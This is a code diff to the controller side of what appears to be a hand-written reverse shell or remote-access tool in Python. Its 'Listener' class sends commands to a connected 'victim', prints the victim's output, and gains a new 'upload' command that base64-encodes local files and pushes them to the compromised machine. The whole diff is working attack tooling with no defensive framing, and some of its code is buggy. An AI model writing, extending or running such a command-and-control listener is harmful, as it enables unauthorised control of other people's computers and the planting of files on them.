@@ -1,4 +1,4 @@
-import socket, sys, json, argparse, subprocess, traceback, base64, logging, time
+import socket, sys, json, argparse, subprocess, traceback, base64, logging, time, os
 from sys import getsizeof
 from itertools import cycle
 import multiprocessing, time
@@ -66,8 +66,29 @@ class Listener:
     
 
     def sendStream(self,data): #base sender with json serialization
-        jsData = json.dumps(data)
-        self.connection.send(str(jsData).encode('utf-8'))
+
+        
+        try:
+            if isinstance(data,dict): #should primarily be using list to send not dict, file name [1], content [2]
+                #print('Trying send dict')
+                content = list(data.values())[0]
+                #print(f'content: {content}')
+                #if isinstance(content, bytes):
+                    #content = content.decode()
+                #print(f'Content: {content}; Type: {type(content)}')
+                jsData = json.dumps(data)
+                #print(jsData)
+                #print(jsData.encode())
+                self.connection.send(jsData.encode('utf-8'))
+
+            else: # should be list that we're sending
+                #dataSnippet = data[2][0:int(len(data[2]*.05))]
+                #print(f'{fc.g}Sending this: {dataSnippet}{fc.end}')
+                #print(f'Trying send data: {type(data)}')
+                jsData = json.dumps(data)
+                self.connection.send(str(jsData).encode('utf-8'))
+        except:
+            print(f'{fc.rw}{traceback.format_exc()}{fc.end}')
     
     
     def recvStream(self):
@@ -87,8 +108,8 @@ class Listener:
                 jsData = jsData + recvData
                 return json.loads(jsData)
         
-            except Exception as e:
-                #print(f'{fc.rw}{e}{fc.end}')
+            except Exception:
+                print(f'{fc.rw}{sys.exc_info()}{fc.end}')
                 continue
     
     
@@ -100,8 +121,16 @@ class Listener:
                 time.sleep(.2)
         
     
-    def utf8len(self,string):
-        return len(string.encode('utf-8'))
+    def utf8len(self,string): #maybe this works??
+        if isinstance(string, str):
+            return len(string.encode('utf-8'))
+        else:
+            return len(string) / 8
+    
+
+    def getSize(self,filename):
+        st = os.stat(filename)
+        return st.st_size
     
     def write_file(self,file,content): #should be default get a dictionary
               
@@ -124,28 +153,32 @@ class Listener:
                 return content
 
 
-    def read_file(self,file): #file will have to be in local directory, maybe add test to make sure '/' not in file string
-            
+    def read_file(self,file): #file will have to be in local directory, maybe add test to make sure '/' not in file string, USING FOR FILE UPLOAD
+            #print(f'passed file: {file}')
             readFileDict = {}
             if '/' in file:
+                print('Splitting non parent file path')
                 file = file.split('/') # split at dir slash, get last item 
-            file = file[-1] #last item
+                file = file[-1] #last item
             
             try:
+                #print('start try')
                 with open(file,'rb') as read_file:
                     value = read_file.read()
-                print(type(value)) #bytes 
+                #print(type(value)) #bytes 
                 value = base64.b64encode(value) # may need to be string?
-                print(f'value,':'{value})
+                value = value.decode()
+                #print(f'value: {value}')
+                #print(f'Passed file type: {type(file)}') #should be string
                 readFileDict[file] = value #dictionary with key,value == file,content
-                ##print(data)
+                #print(readFileDict)
                 return readFileDict #dictionary for download 
             
-            except FileNotFoundError as e:
-                print(e)
+            except FileNotFoundError:
+                print(f'{fc.rw}{traceback.format_exc()}{fc.end}')
             
-            except IndexError as e:
-                print(e)
+            except IndexError:
+                print(f'{fc.rw}{traceback.format_exc()}{fc.end}')
 
     
     def executeCmd(self,cmd):
@@ -192,21 +225,33 @@ class Listener:
                         print('No argument for download, command not executed')
                 
                 elif cmd[0] == 'upload':
-                    print('Starting upload method')
-                    content = self.read_file(cmd[1]) #spits out dictionary with the value being a base64 encoded content
-                    cmd.append(content) # adding dictionary to list 
-                    print(cmd)
-                    self.sendStream(cmd) #don't we just want to send the payload cmd[2]?
+                    spinner = multiprocessing.Process(target=self.spinner) #worked better for spinner, easily terminate a thread 
 
- 
+                    if len(cmd) > 1:
+                        #print('Starting upload method')
+                        readFileDict = self.read_file(cmd[1]) #spits out dictionary with the value being a base64 encoded content 
+                        cmd.append(readFileDict) 
+                        #print(cmd[2][cmd[1]]) 
+                        #print(cmd[2] == None) 
+                        if cmd[2] != None:
+                            print(f'{fc.r}Uploading: {cmd[1]}{fc.end}\n{fc.r}Bytes: {fc.g}{self.getSize(cmd[1])}{fc.end}')
+                            spinner.start()
+                            self.sendStream(cmd)
+                            recv = self.recvStream()
+                            spinner.terminate()
+                            recv = recv['data']
+                            print(f'{fc.purple}#{fc.end}'*100)
+                            print(f'{fc.b}{recv}{fc.end}')
+                            print(f'{fc.purple}#{fc.end}'*100)
+                    else:
+                        print(f'{fc.purple}File name required.{fc.end}')
+
                 else:
                     result = self.executeCmd(cmd)   
                     print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long')
                     print(f'{fc.purple}#{fc.end}'*100)
                     print(f'{fc.b}{result}{fc.end}')
                     print(f'{fc.purple}#{fc.end}'*100)
-            
-
             
 
             else:
